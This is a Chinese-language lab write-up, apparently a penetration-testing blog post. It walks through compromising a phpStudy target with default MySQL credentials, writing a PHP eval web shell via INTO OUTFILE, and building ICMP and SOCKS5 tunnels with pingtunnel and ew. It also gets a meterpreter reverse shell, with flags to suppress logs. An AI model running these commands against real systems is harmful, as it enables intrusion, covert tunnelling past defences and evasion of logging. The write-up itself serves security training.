## icmp隧道搭建

在上个星期一个风和日丽得早上，上班刚打开电脑，师兄就发来了这样一条消息

![image-20210721110118826](https://image.3001.net/images/20210726/1627293576_60fe87883f664b95e4212.png!small)

然后我就去测试了，访问页面如下，页面显示探针路径C:/phpStudy/WWW/l.php

![image-20210721110640198](https://image.3001.net/images/20210726/1627293577_60fe87895bb1858b335b4.png!small)

随手输了个root root检测，没想到真的是（靶场嘛，比较简单，大家勿喷哈~）

![image-20210721110754511](https://image.3001.net/images/20210726/1627293579_60fe878b0421084897ca3.png!small)

![image-20210721110809341](https://image.3001.net/images/20210726/1627293579_60fe878be65946a9c922d.png!small)

使用phpmyadmin连接MySQL，输入root:root

![image-20210721111301712](https://image.3001.net/images/20210726/1627293580_60fe878cbf5b7c422153c.png!small)

### 查询数据库版本

    
    
    select @@version;
    

![image-20210721111602594](https://image.3001.net/images/20210726/1627293581_60fe878dc5fd302474d93.png!small)

基础语法查询是否 secure_file_priv 没有限制

    
    
    show global variables like '%secure_file_priv%';
    

NULL 不允许导入或导出，/tmp 只允许在 /tmp 目录导入导出，空 表示不限制目录

![](https://image.3001.net/images/20210726/1627293582_60fe878ea615c82cf2ae4.png!small)

结果为空，直接写入一句话，这里因为我已经写入了，所以显示的已存在。

    
    
    select '<?php @eval($_POST[zcc]);?>' into outfile 'C:/phpStudy/WWW/zcc1.php';
    

![](https://image.3001.net/images/20210726/1627293583_60fe878f60dabdc944521.png!small)

蚁剑连接

![](https://image.3001.net/images/20210726/1627293584_60fe879030d3a6a2b0b31.png!small)

接下来就练习一下icmp隧道的搭建

#### 工具一：pingtunnel 下载链接：https://github.com/esrrhs/pingtunnel/releases

##### 准备一台kali传上pingtunnel，目标机也传上pingtunnel.exe，kali的ip：192.168.10.65 桥接

![image-20210726101410062](https://image.3001.net/images/20210726/1627293584_60fe8790e7a307e9b6262.png!small)

![image-20210721142732668](https://image.3001.net/images/20210726/1627293585_60fe87919bba2c801b964.png!small)

#### pingtunnel上线

##### vps机上执行以下命令， 开启服务器模式

    
    
    ./pingtunnel -type server
    

![image-20210726105542324](https://image.3001.net/images/20210726/1627293586_60fe8792740795766d8f1.png!small)

客户端执行 以下命令，客户端本地监听8699端口 ，将监听到的连接通过icmpserver发送到Linsten_ip:38975,通过TCP隧道

 **注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件**

    
    
    pingtunnel.exe -type client -l 127.0.0.1:38975 -s icmpserver_ip -t 192.168.10.65:38975 -tcp 1 -noprint 1 -nolog 1
    

![](https://image.3001.net/images/20210726/1627293587_60fe879388e5d5579d573.png!small)

此时服务端会有回显

![image-20210726142918433](https://image.3001.net/images/20210726/1627293588_60fe8794f13e925b84316.png!small)

msf上线

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=38975 -f exe > /tmp/zccccz.exe
    
    
    
    msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.10.65
    set lport 38975
    exploit 
    

![](https://image.3001.net/images/20210726/1627293590_60fe8796c23b678409ce0.png!small)

![](https://image.3001.net/images/20210726/1627293591_60fe87979c4938423e115.png!small)

![image-20210726144312921](https://image.3001.net/images/20210726/1627293592_60fe8798880891b149df9.png!small)

![image-20210726144359393](https://image.3001.net/images/20210726/1627293593_60fe879953c4721f2cb27.png!small)

组合ew建立socks5隧道

ew下载链接：https://github.com/idlefire/ew

这里在kali vps端运行如下命令

    
    
    ./ew_for_linux64 -s rcsocks -l 10080 -e 8898
    ./pingtunnel -type server
    

![](https://image.3001.net/images/20210726/1627293594_60fe879a90fd303c0e74b.png!small)

客户端执行以下命令，ew回显ok，表示隧道打通。

开启ICMP隧道，采用sock5模式，将127.0.0.1:9999（pingtunnel客户端监听端口）所监听到的请求通过192.168.10.65之间的ICMP隧道送至192.168.10.65:8898（ew服务端监听主机端口）

    
    
    pingtunnel.exe -type client -l 127.0.0.1:9999 -s 192.168.10.65 -t 192.168.10.65:8898 -sock5 -1 -noprint 1 -nolog 1
    

![](https://image.3001.net/images/20210726/1627293595_60fe879bf3b5e8c173d04.png!small)

![image-20210726170320821](https://image.3001.net/images/20210726/1627293596_60fe879ce9deb25c072df.png!small)

这里因为靶机出了点问题就关了，打的师兄得虚拟机，所以回显得ip不太一样。

    
    
    ew_for_Win.exe -s rssocks -d 127.0.0.1 -e 9999
    

![](https://image.3001.net/images/20210726/1627293598_60fe879e0f3bff31e9b43.png!small)

![](https://image.3001.net/images/20210726/1627293598_60fe879edb3917a777364.png!small)

连接代理，这里用的proxifier，可以远程访问表示隧道建立成功。

![image-20210726163541780](https://image.3001.net/images/20210726/1627293600_60fe87a00ed08b0b36e3d.png!small)

![66c9aac9323047b5f88b73e115cfb2d](https://image.3001.net/images/20210726/1627293601_60fe87a16e49be332ea69.png!small)

![image-20210726175840545](https://image.3001.net/images/20210726/1627293602_60fe87a291a822d77ac93.png!small)

